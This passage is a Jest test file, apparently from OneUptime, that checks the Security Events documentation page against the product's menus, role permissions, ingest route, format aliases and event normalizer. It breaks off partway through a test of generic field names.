import {
  SECURITY_EVENT_FACETS,
  SecurityEventFacetDefinition,
  applySecurityEventFacetFiltersToQuery,
  toSecurityEventExcludeFacetKey,
} from "../../../FeatureSet/Dashboard/src/Components/SecurityEvents/SecurityEventsFacets";
import {
  SECURITY_EVENT_SEARCH_SUGGESTIONS,
  SecurityEventSearchFilters,
  parseSecurityEventSearch,
} from "../../../FeatureSet/Dashboard/src/Components/SecurityEvents/SecurityEventsSearchQuery";
import { DEFAULT_SECURITY_EVENTS_TIME_RANGE } from "../../../FeatureSet/Dashboard/src/Components/SecurityEvents/SecurityEventsTimeRange";
import {
  SECURITY_MATCH_RAISES_ANSWERS,
  SECURITY_MATCH_RAISES_COPY,
  SECURITY_MATCH_RAISES_FIELD_TITLE,
  SecurityMatchRaises,
  TAXII_SIGN_IN_ANSWERS,
  TAXII_SIGN_IN_COPY,
  TAXII_SIGN_IN_FIELD_TITLE,
  getSecurityMatchRaises,
} from "../../../FeatureSet/Dashboard/src/Components/SecurityEvents/SecurityMatchRaises";
import {
  DETECTION_FINDING_MONITOR_WINDOW_SECONDS,
  buildDetectionRuleMonitorPrefill,
  buildThreatIntelFeedMonitorPrefill,
} from "../../../FeatureSet/Dashboard/src/Utils/SecurityEventsMonitorPrefill";
import {
  SECURITY_EVENTS_MENU,
  SecurityEventsMenuItem,
  SecurityEventsMenuSection,
  getSecurityEventsMenuSectionFor,
} from "../../../FeatureSet/Dashboard/src/Utils/SecurityEventsNavigation";
import PageMap from "../../../FeatureSet/Dashboard/src/Utils/PageMap";
import {
  SECURITY_EVENTS,
  THREAT_INTELLIGENCE,
} from "./AiObservabilityDocsPages";
import { DocsHeading, readPage, scanMarkdown } from "./DocsContentSupport";
import { tables } from "./DocsPageShape";
import SecurityEvent from "Common/Models/AnalyticsModels/SecurityEvent";
import DetectionRule from "Common/Models/DatabaseModels/DetectionRule";
import ThreatIntelFeed from "Common/Models/DatabaseModels/ThreatIntelFeed";
import { Statement } from "Common/Server/Utils/AnalyticsDatabase/Statement";
import OutboundUserAgent from "Common/Server/Utils/OutboundUserAgent";
import SigmaClickhouseCompiler, {
  buildSigmaDistinctCountExpression,
  buildSigmaFieldExpression,
  resolveSigmaField,
} from "Common/Server/Utils/SecurityEvent/Sigma/SigmaClickhouseCompiler";
import ThreatIntelFeedPoller, {
  StixIndicatorParseResult,
  StixParseContext,
} from "Common/Server/Utils/SecurityEvent/ThreatIntel/ThreatIntelFeedPoller";
import Includes from "Common/Types/BaseDatabase/Includes";
import NotEqual from "Common/Types/BaseDatabase/NotEqual";
import NotNull from "Common/Types/BaseDatabase/NotNull";
import Query from "Common/Types/BaseDatabase/Query";
import Search from "Common/Types/BaseDatabase/Search";
import Wildcard from "Common/Types/BaseDatabase/Wildcard";
import { JSONObject, JSONValue } from "Common/Types/JSON";
import { CheckOn } from "Common/Types/Monitor/CriteriaFilter";
import MonitorStep from "Common/Types/Monitor/MonitorStep";
import MonitorStepSecurityEventsMonitor from "Common/Types/Monitor/MonitorStepSecurityEventsMonitor";
import MonitorSteps from "Common/Types/Monitor/MonitorSteps";
import MonitorType, {
  MonitorTypeHelper,
} from "Common/Types/Monitor/MonitorType";
import ObjectID from "Common/Types/ObjectID";
import { PermissionHelper, PermissionProps } from "Common/Types/Permission";
import {
  SecurityEventConnectorCatalog,
  SecurityEventConnectorDefinition,
} from "Common/Types/SecurityEvent/Connectors/SecurityEventConnectorCatalog";
import {
  DETECTION_DISTINCT_COUNT_ATTRIBUTE,
  DETECTION_EVALUATION_DELAY_IN_SECONDS,
  DETECTION_EVALUATION_INTERVAL_MAX_IN_MINUTES,
  DETECTION_EVALUATION_INTERVAL_MIN_IN_MINUTES,
  DETECTION_FINDING_CLASS_NAME,
  DETECTION_FINDING_CLASS_UID,
  DETECTION_GROUP_VALUE_ATTRIBUTE,
  DETECTION_MATCH_COUNT_ATTRIBUTE,
  DETECTION_MATCH_COUNT_THRESHOLD_MAX,
  DETECTION_MATCH_COUNT_THRESHOLD_MIN,
  DETECTION_MAX_FINDINGS_PER_EVALUATION,
  DETECTION_MAX_GROUPS_PER_EVALUATION,
  DETECTION_MAX_LOOKBACK_IN_MINUTES,
  DETECTION_RULE_ID_ATTRIBUTE,
  DETECTION_RULE_NAME_ATTRIBUTE,
  DETECTION_SIGMA_ID_ATTRIBUTE,
} from "Common/Types/SecurityEvent/DetectionFindingConstants";
import {
  DETECTION_REAL_TIME_RULES_MAX,
  REAL_TIME_CORRELATION_PROBLEM,
  REAL_TIME_DISTINCT_COUNT_PROBLEM,
  REAL_TIME_REGULAR_EXPRESSION_PROBLEM,
  REAL_TIME_THRESHOLD_PROBLEM,
} from "Common/Types/SecurityEvent/RealTimeDetection";
import { DETECTION_RULE_REAL_TIME } from "../../../FeatureSet/Dashboard/src/Components/SecurityEvents/SecurityDetectionStatus";
import NormalizedSecurityEvent from "Common/Types/SecurityEvent/NormalizedSecurityEvent";
import OcsfSeverity, {
  normalizeOcsfSeverity,
} from "Common/Types/SecurityEvent/OcsfSeverity";
import SecurityEventFormat from "Common/Types/SecurityEvent/SecurityEventFormat";
import SigmaRule, {
  SIGMA_DEFAULT_LEVEL,
  SIGMA_LEVEL_TO_OCSF_SEVERITY,
  SIGMA_SUPPORTED_MODIFIERS,
  SigmaLevel,
  isSevereSigmaLevel,
} from "Common/Types/SecurityEvent/SigmaRule";
import {
  ENRICHMENT_CONFIDENCE_ATTRIBUTE,
  ENRICHMENT_FEED_ATTRIBUTE,
  ENRICHMENT_FEED_ID_ATTRIBUTE,
  ENRICHMENT_INDICATOR_ID_ATTRIBUTE,
  ENRICHMENT_INDICATOR_TYPE_ATTRIBUTE,
  ENRICHMENT_INDICATOR_VALUE_ATTRIBUTE,
  ENRICHMENT_MATCHED_ATTRIBUTE,
  ENRICHMENT_MATCHED_VALUE,
  ENRICHMENT_MATCH_COUNT_ATTRIBUTE,
  THREAT_CONFIDENCE_ATTRIBUTE,
  THREAT_FEED_ID_ATTRIBUTE,
  THREAT_FEED_NAME_ATTRIBUTE,
  THREAT_INDICATOR_ID_ATTRIBUTE,
  THREAT_INDICATOR_TYPE_ATTRIBUTE,
  THREAT_INDICATOR_VALUE_ATTRIBUTE,
  THREAT_INTEL_DEFAULT_POLL_INTERVAL_IN_MINUTES,
  THREAT_INTEL_DEFAULT_VALID_DAYS,
  THREAT_INTEL_FIRST_MATCH_WINDOW_IN_MINUTES,
  THREAT_INTEL_MATCH_MAX_LOOKBACK_IN_MINUTES,
  THREAT_INTEL_MAX_FINDINGS_PER_EVALUATION,
  THREAT_INTEL_MAX_INDICATORS_PER_EVALUATION,
  THREAT_INTEL_MINIMUM_CONFIDENCE_MAX,
  THREAT_INTEL_MINIMUM_CONFIDENCE_MIN,
  THREAT_INTEL_POLL_INTERVAL_MAX_IN_MINUTES,
  THREAT_INTEL_POLL_INTERVAL_MIN_IN_MINUTES,
  THREAT_INTEL_PRODUCT_NAME,
  THREAT_MATCH_COUNT_ATTRIBUTE,
  ThreatIntelIndicatorType,
  ocsfSeverityForConfidence,
} from "Common/Types/SecurityEvent/ThreatIntelConstants";
import TimeRange from "Common/Types/Time/TimeRange";
import GenericNormalizer from "Common/Utils/SecurityEvent/GenericNormalizer";
import OcsfNormalizer from "Common/Utils/SecurityEvent/OcsfNormalizer";
import SecurityEventNormalizer from "Common/Utils/SecurityEvent/SecurityEventNormalizer";
import SigmaRuleParser from "Common/Utils/SecurityEvent/Sigma/SigmaRuleParser";
import SigmaRuleSetParser, {
  sigmaRulesOf,
} from "Common/Utils/SecurityEvent/Sigma/SigmaRuleSetParser";
import {
  bindSigmaWatchlists,
  getDetectionRuleWatchlistReferences,
} from "Common/Utils/SecurityEvent/Sigma/SigmaWatchlists";
import { SigmaWatchlists } from "Common/Types/SecurityEvent/SecurityWatchlist";
import { DetectionRuleDefinition } from "Common/Types/SecurityEvent/SigmaCorrelation";
import { SecurityEntityType } from "Common/Types/SecurityCase/SecurityEntity";
import ThreatIntelFeedType, {
  RECOMMENDED_THREAT_INTEL_LISTS,
  RecommendedThreatIntelList,
  THREAT_INTEL_FEED_TYPE_DEFINITIONS,
  THREAT_INTEL_GOOGLE_SECOPS_MAX_WINDOW_IN_DAYS,
  THREAT_INTEL_GOOGLE_SECOPS_VALID_DAYS,
  THREAT_INTEL_LIST_MAX_INDICATORS,
  THREAT_INTEL_LIST_MIN_POLL_INTERVAL_IN_MINUTES,
  THREAT_INTEL_LIST_VALID_DAYS,
  ThreatIntelFeedTypeDefinition,
} from "Common/Types/SecurityEvent/ThreatIntelFeedType";
import IndicatorListParser from "Common/Utils/SecurityEvent/ThreatIntel/IndicatorListParser";
import StixPatternParser, {
  ParsedIndicatorValue,
} from "Common/Utils/SecurityEvent/ThreatIntel/StixPatternParser";
import { describe, expect, it } from "@jest/globals";
import fs from "fs";
import path from "path";

/*
 * Docs overhaul task 24b: what the Security Events (SIEM) and Threat
 * Intelligence (STIX/TAXII) pages say about OneUptime, held to the code that
 * does it - the ingest route, its formats and their aliases, how each format
 * is read, the connectors, the explorer's search, facets and window, the
 * Sigma parser and compiler, the detection engine, the Security Events
 * monitor, the threat intel feed form, poller, parser, enricher and matcher,
 * and the monitors a rule or a feed pre-fills. The translations are held to
 * these English pages by AiToolingAndSecurityDocsTranslations.
 *
 * Where the code is pure (Common's types, the normalizers, the Sigma parser
 * and compiler, the STIX parsers, the Dashboard's search, facet and monitor
 * pre-fill helpers) it is imported and run on the pages' own examples. Where
 * it reaches a database or is a React page (the ingest service, the
 * evaluators, the matcher's queries, the Dashboard's forms and menus) it is
 * read as text.
 */

const REPO_DIR: string = path.resolve(__dirname, "../../../../..");
const DASHBOARD: string = "packages/App/FeatureSet/Dashboard/src";
const SECURITY: string = "packages/Common/Server/Utils/SecurityEvent";

const SOURCES: Record<string, string> = {
  navigation: `${DASHBOARD}/Utils/SecurityEventsNavigation.ts`,
  navigationItems: `${DASHBOARD}/Utils/NavigationItems.tsx`,
  connectionsTable: `${DASHBOARD}/Components/SecurityEvents/SecurityEventConnectionsTable.tsx`,
  detectionRules: `${DASHBOARD}/Pages/SecurityEvents/DetectionRules.tsx`,
  threatIntel: `${DASHBOARD}/Pages/SecurityEvents/ThreatIntel.tsx`,
  // The On Match step both draw, and its choices' words.
  securityMatchFields: `${DASHBOARD}/Components/SecurityEvents/SecurityMatchActionFields.ts`,
  securityMatchRaises: `${DASHBOARD}/Components/SecurityEvents/SecurityMatchRaises.ts`,
  monitorForm: `${DASHBOARD}/Components/Form/Monitor/SecurityEventsMonitor/SecurityEventsMonitorStepForm.tsx`,
  telemetrySettings: `${DASHBOARD}/Pages/Settings/TelemetrySettings.tsx`,
  settingsSideMenu: `${DASHBOARD}/Pages/Settings/SideMenu.tsx`,
  setupGuide: `${DASHBOARD}/Components/SecurityEvents/SecurityEventsSetupGuide.tsx`,
  ingestRoute: "packages/App/FeatureSet/Telemetry/API/SecurityEventsIngest.ts",
  ingestService:
    "packages/App/FeatureSet/Telemetry/Services/SecurityEventsIngestService.ts",
  otelIngestBase:
    "packages/App/FeatureSet/Telemetry/Services/OtelIngestBaseService.ts",
  genericNormalizer: "packages/Common/Utils/SecurityEvent/GenericNormalizer.ts",
  securityEventModel: "packages/Common/Models/AnalyticsModels/SecurityEvent.ts",
  securityEventService:
    "packages/Common/Server/Services/SecurityEventService.ts",
  indicatorService:
    "packages/Common/Server/Services/ThreatIntelIndicatorService.ts",
  connectionPoller: `${SECURITY}/Connectors/SecurityEventConnectionPoller.ts`,
  detectionEvaluator: `${SECURITY}/DetectionRuleEvaluator.ts`,
  alerting: `${SECURITY}/SecurityEventAlerting.ts`,
  taxiiClient: `${SECURITY}/ThreatIntel/TaxiiClient.ts`,
  feedPoller: `${SECURITY}/ThreatIntel/ThreatIntelFeedPoller.ts`,
  enricher: `${SECURITY}/ThreatIntel/ThreatIntelEnricher.ts`,
  matcher: `${SECURITY}/ThreatIntel/ThreatIntelMatcher.ts`,
  httpFetch: "packages/Common/Server/Utils/DataSource/HttpFetch.ts",
  detectionJob:
    "packages/App/FeatureSet/Workers/Jobs/DetectionRules/EvaluateDetectionRules.ts",
  // A real-time rule: the screen every write runs, its jobs and the rule's service.
  realTimeScreen: `${SECURITY}/RealTime/RealTimeDetections.ts`,
  realTimeJobs: `${SECURITY}/RealTime/RealTimeJobs.ts`,
  detectionRuleService:
    "packages/Common/Server/Services/DetectionRuleService.ts",
  matchJob:
    "packages/App/FeatureSet/Workers/Jobs/ThreatIntel/MatchThreatIntelIndicators.ts",
  pollJob:
    "packages/App/FeatureSet/Workers/Jobs/ThreatIntel/PollThreatIntelFeeds.ts",
  foldTitles:
    "packages/Common/UI/Components/FoldedSection/FoldedSectionTitles.ts",
  facetValueRow:
    "packages/Common/UI/Components/TelemetryViewer/components/TelemetryFacetValueRow.tsx",
};

const INLINE_CODE: RegExp = /`([^`]+)`/g;
const BOLD: RegExp = /\*\*([^*\n]+?)\*\*/g;
const LINE_BREAK: RegExp = /\n/;
const WHITESPACE: RegExp = /\s+/g;
const NUMBERED_STEP: RegExp = /^\d\. /;
// One option of the monitor's window dropdown: `label: "Last 5 seconds",`.
const WINDOW_OPTION: RegExp = /label: "(Last [^"]+)",/g;
// A string array of a source read as text: `const NAME: Array<string> = [ ... ];`.
const STRING_ARRAY: RegExp = /const ([A-Z_]+): Array<string> = \[([^\]]*)\];/g;
const QUOTED: RegExp = /"([^"]+)"/g;
// The JSON a curl example posts: `-d '{ ... }'`.
const CURL_BODY: RegExp = /-d '(\{.*\})'/;
// The finding class a connector's Imports cell names: ", as Detection Findings".
const IMPORTED_AS: RegExp = /, as ([A-Za-z ]+) Findings$/;
// The user agent the threat page names: `OneUptime/<version> (+...)`.
const NAMED_USER_AGENT: RegExp = /`(OneUptime\/<version> [^`]+)`/;
const DAY_IN_MILLISECONDS: number = 24 * 60 * 60 * 1000;

function source(name: string): string {
  return fs.readFileSync(path.join(REPO_DIR, SOURCES[name] as string), "utf8");
}

function englishPage(page: string): string {
  return readPage("en", page);
}

function allMatches(
  text: string,
  pattern: RegExp,
  group: number,
): Array<string> {
  return Array.from(text.matchAll(pattern)).map(
    (match: RegExpMatchArray): string => {
      return match[group] as string;
    },
  );
}

function codeSpans(text: string): Array<string> {
  return allMatches(text, INLINE_CODE, 1);
}

function boldSpans(text: string): Array<string> {
  return allMatches(text, BOLD, 1);
}

function flat(text: string): string {
  return text.replace(WHITESPACE, " ");
}

function section(markdown: string, heading: string): string {
  const headings: Array<DocsHeading> = scanMarkdown(markdown).headings;
  const index: number = headings.findIndex((entry: DocsHeading): boolean => {
    return entry.text === heading;
  });

  expect({ heading, found: index >= 0 }).toEqual({ heading, found: true });

  const start: DocsHeading = headings[index] as DocsHeading;
  const next: DocsHeading | undefined = headings
    .slice(index + 1)
    .find((entry: DocsHeading): boolean => {
      return entry.level <= start.level;
    });
  const lines: Array<string> = markdown.split(LINE_BREAK);

  return lines
    .slice(start.line, next ? next.line - 1 : lines.length)
    .join("\n");
}

// The one line of a section that starts with these words.
function lineStarting(
  markdown: string,
  heading: string,
  start: string,
): string {
  const line: string | undefined = section(markdown, heading)
    .split(LINE_BREAK)
    .find((candidate: string): boolean => {
      return candidate.startsWith(start);
    });

  expect({ start, found: line !== undefined }).toEqual({ start, found: true });

  return line as string;
}

function numberedSteps(markdown: string, heading: string): Array<string> {
  return section(markdown, heading)
    .split(LINE_BREAK)
    .filter((line: string): boolean => {
      return NUMBERED_STEP.test(line);
    });
}

function rowsOf(
  markdown: string,
  heading: string,
  which: number = 0,
): Array<Array<string>> {
  const found: Array<Array<Array<string>>> = tables(section(markdown, heading));

  expect(found.length).toBeGreaterThan(which);

  return (found[which] as Array<Array<string>>).slice(1);
}

function firstCells(rows: Array<Array<string>>): Array<string> {
  return rows.map((row: Array<string>): string => {
    return row[0] as string;
  });
}

function rowNamed(rows: Array<Array<string>>, name: string): Array<string> {
  const row: Array<string> | undefined = rows.find(
    (cells: Array<string>): boolean => {
      return cells[0] === name;
    },
  );

  expect({ name, found: row !== undefined }).toEqual({ name, found: true });

  return row as Array<string>;
}

// The string arrays a source declares, by constant name.
function stringArrays(text: string): Map<string, Array<string>> {
  return new Map(
    Array.from(text.matchAll(STRING_ARRAY)).map(
      (match: RegExpMatchArray): [string, Array<string>] => {
        return [match[1] as string, allMatches(match[2] as string, QUOTED, 1)];
      },
    ),
  );
}

// Whether `list` appears in `of`, in the same order, perhaps with gaps.
function isOrderedSubsequence(list: Array<string>, of: Array<string>): boolean {
  let at: number = 0;

  for (const entry of of) {
    if (entry === list[at]) {
      at++;
    }
  }

  return at === list.length;
}

// The code of a fenced block whose info string carries this title.
function codeBlockTitled(markdown: string, title: string): string {
  const fence: { code: string } | undefined = scanMarkdown(
    markdown,
  ).fences.find((candidate: { info: string }): boolean => {
    return candidate.info.includes(`title="${title}"`);
  });

  expect({ title, found: fence !== undefined }).toEqual({
    title,
    found: true,
  });

  return (fence as { code: string }).code;
}

// The code of each fenced block of a section, in order.
function codeBlocksOf(markdown: string): Array<string> {
  return scanMarkdown(markdown).fences.map(
    (fence: { code: string }): string => {
      return fence.code;
    },
  );
}

// The first event each curl example of "Post your events" posts.
function examplePayloads(page: string): Array<JSONObject> {
  return codeBlocksOf(section(page, "Post your events")).map(
    (block: string): JSONObject => {
      const body: JSONObject = JSON.parse(
        (block.match(CURL_BODY) as RegExpMatchArray)[1] as string,
      ) as JSONObject;

      return (body["events"] as Array<JSONObject>)[0] as JSONObject;
    },
  );
}

// Every scalar value of a JSON payload, as text.
function leafValues(value: JSONValue): Array<string> {
  if (Array.isArray(value)) {
    return value.flatMap((item: JSONValue): Array<string> => {
      return leafValues(item);
    });
  }

  if (value !== null && typeof value === "object") {
    return Object.values(value as JSONObject).flatMap(
      (item: JSONValue): Array<string> => {
        return leafValues(item);
      },
    );
  }

  return [String(value)];
}

function securityEventsStepOf(
  prefill: JSONObject,
): MonitorStepSecurityEventsMonitor {
  const steps: MonitorSteps = MonitorSteps.fromJSON(
    prefill["monitorSteps"] as JSONObject,
  );
  const step: MonitorStep | undefined =
    steps.data?.monitorStepsInstanceArray[0];

  expect(step?.data?.securityEventsMonitor).toBeDefined();

  return step!.data!.securityEventsMonitor!;
}

function permissionTitled(title: string): PermissionProps {
  const found: PermissionProps | undefined =
    PermissionHelper.getAllPermissionProps().find(
      (props: PermissionProps): boolean => {
        return props.title === title;
      },
    );

  expect({ title, found: found !== undefined }).toEqual({
    title,
    found: true,
  });

  return found as PermissionProps;
}

// A Sigma rule of one selection and that condition.
function sigmaRule(selection: string): string {
  return `title: t\ndetection:\n  selection:\n${selection}\n  condition: selection\n`;
}

function compiledSql(ruleYaml: string): Statement {
  return SigmaClickhouseCompiler.compileYaml(ruleYaml);
}

/*
 * A rule as a save compiles it: the watchlists it names bound as a project
 * that keeps them binds them, each a list of users kept by hand.
 */
function compiledSqlAsSaved(ruleYaml: string): Statement {
  const definition: DetectionRuleDefinition =
    SigmaRuleSetParser.parse(ruleYaml);
  const watchlists: SigmaWatchlists = {};

  for (const reference of getDetectionRuleWatchlistReferences(definition)) {
    watchlists[reference.key] = {
      name: reference.name,
      entityType: SecurityEntityType.User,
      exactValues: ["adm"],
      patterns: ["adm*"],
      ranges: [],
    };
  }

  const rule: SigmaRule | undefined = sigmaRulesOf(
    bindSigmaWatchlists(definition, watchlists),
  )[0];

  return SigmaClickhouseCompiler.compile(rule!);
}

function boundValues(statement: Statement): Array<unknown> {
  return Object.values(statement.query_params);
}

describe("the Security Events page", () => {
  const page: string = englishPage(SECURITY_EVENTS);

  it("opens the product from Products → Security Events, which the Products menu lists under Observability", () => {
    const items: string = source("navigationItems");
    const entry: string = items.slice(
      items.indexOf('t("navbar.items.securityEventsTitle", "Security Events")'),
    );

    expect(entry.length).toBeLessThan(items.length);
    expect(entry.slice(0, entry.indexOf("category:") + 40)).toContain(
      "category: observabilityCategory",
    );
    expect(page).toContain(
      "Open **Products → Security Events**, under **Observability**. Its menu has a section for each part of Security, and a page of its own for each thing in it:",
    );
  });

  it("names every page, and the menu section it sits in, in the order the product draws them", () => {
    // Every page of every section, as the side menu lists them: no tabs.
    const expected: Array<[string, string]> = SECURITY_EVENTS_MENU.flatMap(
      (section: SecurityEventsMenuSection): Array<[string, string]> => {
        return section.items.map(
          (item: SecurityEventsMenuItem): [string, string] => {
            return [`**${item.title}**`, section.title];
          },
        );
      },
    );

    expect(
      SECURITY_EVENTS_MENU.map((section: SecurityEventsMenuSection): string => {
        return section.title;
      }),
    ).toEqual([
      "Overview",
      "Security Cases",
      "Events",
      "Detections",
      "Playbooks",
      "AI",
      "Connections",
      "Settings",
    ]);
    expect(
      rowsOf(page, "How it works").map(
        (row: Array<string>): [string, string] => {
          return [row[0] as string, row[1] as string];
        },
      ),
    ).toEqual(expected);
    expect(page).not.toContain("as tabs across the top of the page");
  });

  it("names the sections that start folded, as the menu folds them", () => {
    expect(
      SECURITY_EVENTS_MENU.filter(
        (section: SecurityEventsMenuSection): boolean => {
          return Boolean(section.startsCollapsed);
        },
      ).map((section: SecurityEventsMenuSection): string => {
        return section.title;
      }),
    ).toEqual(["Detections", "AI", "Connections", "Settings"]);
    expect(page).toContain(
      "**Detections**, **AI**, **Connections** and **Settings**, set up once, stay folded until you open them.",
    );
  });

  it("says only Project Owner, Project Admin and the three Security roles read security data, as the event model allows", () => {
    const model: string = flat(source("securityEventModel"));

    expect(model).toContain(
      "const readPermissions: Array<Permission> = [ Permission.ProjectOwner, Permission.ProjectAdmin, Permission.SecurityAdmin, Permission.SecurityMember, Permission.SecurityViewer, Permission.ReadSecurityEvent, ];",
    );
    expect(page).toContain(
      "Security data is read only by the Project Owner and Project Admin roles and by the three Security roles; other roles see nothing in Security Events.",
    );
  });

  it("says what each Security role may do, as the roles describe themselves", () => {
    const rows: Array<Array<string>> = rowsOf(page, "Before you begin");

    expect(firstCells(rows)).toEqual([
      "Security Admin",
      "Security Member",
      "Security Viewer",
    ]);
    expect(permissionTitled("Security Admin").description).toContain(
      "Full control over security operations: security events, cases with their detections, notes, tasks and evidence, response playbooks and their runs, Sigma detection rules, threat intelligence feeds and their indicators, and security event connections",
    );
    expect(rowNamed(rows, "Security Admin")[1]).toBe(
      "Everything: events, cases, playbooks, detection rules, threat intel feeds and connections",
    );
    expect(permissionTitled("Security Member").description).toContain(
      "works security cases (opens, assigns, changes and closes them, writes their notes, works their tasks and adds evidence), runs playbooks and approves their steps, and creates, changes and deletes detection rules and threat intel feeds. Cannot configure playbooks or security event connections, or delete security data.",
    );
    expect(rowNamed(rows, "Security Member")[1]).toBe(
      "Read events and threat intel, work cases, run playbooks and approve their steps, and create, change and delete detection rules and feeds. It can't set up playbooks or connections, or delete security data.",
    );
    expect(permissionTitled("Security Viewer").description).toBe(
      "Read-only access to security events, cases with their detections, notes, tasks and evidence, playbooks and their runs, detection rules, threat intelligence feeds and indicators, and security event connections.",
    );
    expect(rowNamed(rows, "Security Viewer")[1]).toBe(
      "Read events, cases, playbooks, rules, feeds, indicators and connections",
    );
  });

  it("posts to the route ingest serves, with the ingestion key header, billed as Security Events", () => {
    const route: string = source("ingestRoute");

    expect(route).toContain('"/security-events/v1/ingest",');
    expect(route).toContain(
      "(req as TelemetryRequest).productType = ProductType.SecurityEvents;",
    );
    expect(page).toContain(
      "Send JSON to `/security-events/v1/ingest` with the key in `x-oneuptime-token`:",
    );
    expect(page).toContain(
      "Open **Project Settings → Telemetry & APM → Ingestion Keys** and click **Create Ingestion Key**. Security events use the same keys as the rest of your telemetry.",
    );
  });

  it("answers 200 only once the events are queued", () => {
    const service: string = flat(source("ingestService"));
    const queued: number = service.indexOf(
      "await SecurityEventsQueueService.addSecurityEventsIngestJob(",
    );
    const answered: number = service.indexOf(
      "Response.sendEmptySuccessResponse(req, res);",
    );

    expect(queued).toBeGreaterThan(0);
    expect(answered).toBeGreaterThan(queued);
    expect(page).toContain(
      "The endpoint answers `200` once the events are queued.",
    );
  });

  it("lists the formats ingest knows and the aliases it accepts for them", () => {
    const rows: Array<Array<string>> = rowsOf(page, "Formats");
    const formats: Array<string> = rows.map((row: Array<string>): string => {
      return codeSpans(row[0] as string)[0] as string;
    });

    expect(formats).toEqual(Object.values(SecurityEventFormat));

    for (const row of rows) {
      const format: string = codeSpans(row[0] as string)[0] as string;
      const aliases: Array<string> = codeSpans(row[2] as string);

      expect(SecurityEventNormalizer.parseFormat(format)).toBe(format);

      for (const alias of aliases) {
        expect({
          alias,
          format: SecurityEventNormalizer.parseFormat(alias),
        }).toEqual({
          alias,
          format,
        });
      }
    }
  });

  it("names the format by query, header or body field, and works it out per event when none is named", () => {
    const service: string = flat(source("ingestService"));

    expect(service).toContain(
      'const fromQuery: string = String(req.query?.["format"] || "");',
    );
    expect(service).toContain(
      'req.headers?.["x-oneuptime-security-event-format"] || "",',
    );
    expect(service).toContain(
      'String((req.body as JSONObject)["format"] || "")',
    );
    expect(service).toContain("fromQuery || fromHeader || fromBody");
    expect(page).toContain(
      'Name the format with `?format=`, with the `x-oneuptime-security-event-format` header, or with a top-level `"format"` field. Leave it out, and each event\'s format is worked out on its own, so one webhook can mix detections with raw events.',
    );
  });

  it("recognises each of the page's three examples as the format its tab names", () => {
    const payloads: Array<JSONObject> = examplePayloads(page);
    const expected: Array<SecurityEventFormat> = [
      SecurityEventFormat.Ocsf,
      SecurityEventFormat.Udm,
      SecurityEventFormat.Generic,
    ];

    expect(payloads.length).toBe(expected.length);

    payloads.forEach((payload: JSONObject, index: number) => {
      expect(SecurityEventNormalizer.detectFormat(payload)).toBe(
        expected[index],
      );
    });
  });

  it("reads each example with the severity, class, user, host and IP address the next step promises", () => {
    for (const payload of examplePayloads(page)) {
      const event: NormalizedSecurityEvent | null =
        SecurityEventNormalizer.normalize(payload);

      expect(event).not.toBeNull();
      expect({
        severity: event!.severityName,
        hasClass: event!.className.length > 0,
        hasUser: event!.principalUser.length > 0,
        hasHost: event!.principalHost.length > 0,
        hasIp: event!.principalIp.length > 0,
      }).toEqual({
        severity: OcsfSeverity.High,
        hasClass: true,
        hasUser: true,
        hasHost: true,
        hasIp: true,
      });
    }

    expect(page).toContain(
      "Open **Products → Security Events → Events**. The events show within a few seconds, with their severity, class, user, host and IP addresses filled in.",
    );
  });

  it("sends the examples without a time, so they land in the explorer's past day at the moment they arrive", () => {
    for (const payload of examplePayloads(page)) {
      const before: number = Date.now();
      const event: NormalizedSecurityEvent | null =
        SecurityEventNormalizer.normalize(payload);
      const after: number = Date.now();

      expect(event!.time.getTime()).toBeGreaterThanOrEqual(before);
      expect(event!.time.getTime()).toBeLessThanOrEqual(after);
    }

    expect(DEFAULT_SECURITY_EVENTS_TIME_RANGE.range).toBe(
      TimeRange.PAST_ONE_DAY,
    );
    expect(page).toContain(
      "An event sent without a time, like these, is placed at the moment it arrives.",
    );
  });

  it("keeps every field of each example in the event's attributes, under dotted keys", () => {
    for (const payload of examplePayloads(page)) {
      const event: NormalizedSecurityEvent | null =
        SecurityEventNormalizer.normalize(payload);
      const stored: Array<string> = Object.values(event!.attributes).map(
        (value: unknown): string => {
          return String(value);
        },
      );

      for (const value of leafValues(payload)) {
        expect({ value, kept: stored.includes(value) }).toEqual({
          value,
          kept: true,
        });
      }
    }

    expect(
      Object.keys(
        SecurityEventNormalizer.normalize(examplePayloads(page)[0]!)!
          .attributes,
      ),
    ).toContain("actor.user.name");
    expect(page).toContain(
      "- Nothing is dropped because it didn't map: every field of the source arrives in the event's attributes.",
    );
  });

  it("takes one event, an array of them, or { events: [...] }", () => {
    expect(source("ingestService")).toContain(
      'Send a JSON object, an array of objects, or { "events": [...] }.',
    );
    expect(page).toContain(
      '- The body can be one event, an array of events, or `{ "events": [...] }`.',
    );
  });

  it("files events under the header's service, else the first event's product or vendor, else Security Events", () => {
    const service: string = flat(source("ingestService"));

    expect(service).toContain(
      'private static readonly DEFAULT_SERVICE_NAME: string = "Security Events";',
    );
    expect(service).toContain(
      "normalizedEvents[0]!.productName || normalizedEvents[0]!.vendorName || this.DEFAULT_SERVICE_NAME,",
    );
    expect(source("otelIngestBase")).toContain(
      'req.headers["x-oneuptime-service-name"]',
    );
    expect(page).toContain(
      "Without it, they belong to the service named after the first event's product or vendor, or to `Security Events`.",
    );
  });

  it("reads a generic event's fields from the names the normalizer tries, in its order", () => {
    const rows: Array<Array<string>> = rowsOf(page, "Generic JSON fields");
    const lists: Map<string, Array<string>> = stringArrays(
      source("genericNormalizer"),
    );
    const listFor: Record<string, string> = {
      message: "MESSAGE_FIELDS",
      severityName: "SEVERITY_FIELDS",
      time: "TIME_FIELDS",
      principalUser: "USER_FIELDS",
      principalHost: "HOST_FIELDS",
      principalIp: "SOURCE_IP_FIELDS",
      targetIp: "TARGET_IP_FIELDS",
      className: "TYPE_FIELDS",
      ruleName: "RULE_NAME_FIELDS",
      productName: "PRODUCT_FIELDS",
      processName: "PROCESS_NAME_FIELDS",
      processPath: "PROCESS_PATH_FIELDS",
      processCommandLine: "COMMAND_LINE_FIELDS",
      parentProcessName: "PARENT_PROCESS_NAME_FIELDS",
      parentProcessPath: "PARENT_PROCESS_PATH_FIELDS",
      parentProcessCommandLine: "PARENT_COMMAND_LINE_FIELDS",
    };

    expect(
      rows.map((row: Array<string>): string => {
        return codeSpans(row[0] as string)[0] as string;
      }),
    ).toEqual(Object.keys(listFor));

    for (const row of rows) {
      const field: string = codeSpans(row[0] as string)[0] as string;
      const listed: Array<string> = codeSpans(row[1] as string);
      const tried: Array<string> = lists.get(listFor[field] as string) || [];

      // The page names the snake_case spellings, the first of them first.
      expect({ field, first: listed[0] }).toEqual({ field, first: tried[0] });
      expect({ field, inOrder: isOrderedSubsequence(listed, tried) }).toEqual({
        field,
